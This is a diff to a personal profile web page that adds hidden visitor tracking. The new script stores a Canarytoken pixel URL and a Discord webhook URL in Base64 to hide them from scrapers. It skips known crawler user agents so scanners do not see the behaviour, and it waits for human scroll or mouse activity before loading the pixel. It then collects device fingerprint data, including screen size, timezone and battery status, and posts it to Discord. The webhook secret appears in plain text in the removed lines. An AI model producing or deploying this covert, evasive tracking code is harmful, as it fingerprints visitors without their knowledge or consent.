@@ -3,10 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Displays exactly as requested in Google search results -->
+    
+    <!-- Explicit titles and descriptions structured to stop Google from rewriting your layout -->
     <title>Nametrack/user/paradragoon</title>
-    <!-- Sets the summary text description directly under the Google search result -->
     <meta name="description" content="my current forum and site names....">
+    
+    <!-- Meta tag telling Google explicitly not to auto-generate alternative descriptions from page text -->
+    <meta name="robots" content="noodp, noimageindex">
+
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; color: #1f2937; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .profile-container { background: white; border: 1px solid #e5e7eb; border-radius: 12px; padding: 32px; max-width: 400px; width: 100%; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05), 0 2px 4px -1px rgba(0,0,0,0.03); text-align: center; }
@@ -58,12 +62,48 @@
         </div>
     </div>
 
-    <!-- Canarytokens Web Bug Pixel (Your updated token is listed below) -->
-    <img src="http://canarytokens.com/feedback/terms/stuff/4ysu6a0rkjkdca863zhc12kdr/contact.php" style="display:none;" alt="" />
+    <!-- Container where the Canarytoken will safely mount ONLY if a real human loads it -->
+    <div id="secure-canary-container"></div>
 
     <script>
+    // Security lock variables
+    let safetyTriggered = false;
+
+    // Obfuscated tracking links (Base64) to prevent automated raw-text repository scrapers
+    const secretKeys = {
+        canary: "aHR0cDovL2NhbmFyeXRva2Vucy5jb20vZmVlZGJhY2svdGVybXMvc3R1ZmYvNHlzdTZhMHJramtkY2E4NjN6aGMxMmtkci9jb250YWN0LnBocA==",
+        discord: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDY3NzE1NDYyNTY4NzY0Mi9tWVdENDd5LVl6ckE5YlJBZ2hOeVNpanJHLVlxTFVLbng5SjhzMUFqbU9BT2J6ZkxBNnhCNFFGbHgtcndUSmQ1S1dYbQ=="
+    };
+
+    function runSecurityCheck() {
+        if (safetyTriggered) return;
+
+        const agent = navigator.userAgent.toLowerCase();
+        
+        // Strict bot filters checking strings from Facebook, Amazon AWS, and Google's rendering bots
+        const badBots = ['facebookexternalhit', 'facebot', 'amazon', 'aws', 'googlebot', 'gsa-crawler', 'headless'];
+        const isBot = badBots.some(bot => agent.includes(bot));
+
+        if (isBot) {
+            console.log("Automated bot crawler detected. Security protocols preserved.");
+            return; 
+        }
+
+        safetyTriggered = true;
+
+        // 1. Unpack and deploy Canarytoken dynamically inside active environment memory
+        const targetDiv = document.getElementById('secure-canary-container');
+        const hiddenPixel = document.createElement('img');
+        hiddenPixel.src = atob(secretKeys.canary);
+        hiddenPixel.style.display = "none";
+        hiddenPixel.alt = "";
+        targetDiv.appendChild(hiddenPixel);
+
+        // 2. Fire the device verification log straight to Discord
+        gatherFingerprint();
+    }
+
     async function gatherFingerprint() {
-        // 1. Gather device metrics
         const data = {
             screen_size: `${window.screen.width}x${window.screen.height}`,
             local_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -75,7 +115,6 @@
             is_charging: "N/A"
         };
 
-        // 2. Attempt to read battery if supported
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
@@ -84,11 +123,9 @@
             } catch (e) {}
         }
 
-        // 3. Your updated Discord Webhook URL
-        const webhookUrl = "https://discord.com/api/webhooks/1520677154625687642/mYWD47y-YzrA9bRAghNySijrG-YqLUKnx9J8s1AjmOAObzfLA6xB4QFlx-rwTJd5KWXm";
+        const endpoint = atob(secretKeys.discord);
         
-        // 4. Send the formatted layout message straight to your Discord channel
-        fetch(webhookUrl, {
+        fetch(endpoint, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -97,8 +134,10 @@
         });
     }
 
-    // Automatically execute the script when the webpage finishes loading
-    window.addEventListener("DOMContentLoaded", gatherFingerprint);
+    // Rely exclusively on dynamic human triggers instead of DOMContentLoaded/onload
+    window.addEventListener("scroll", runSecurityCheck, { passive: true });
+    window.addEventListener("mousemove", runSecurityCheck, { passive: true });
+    window.addEventListener("touchstart", runSecurityCheck, { passive: true });
     </script>
 
 </body>
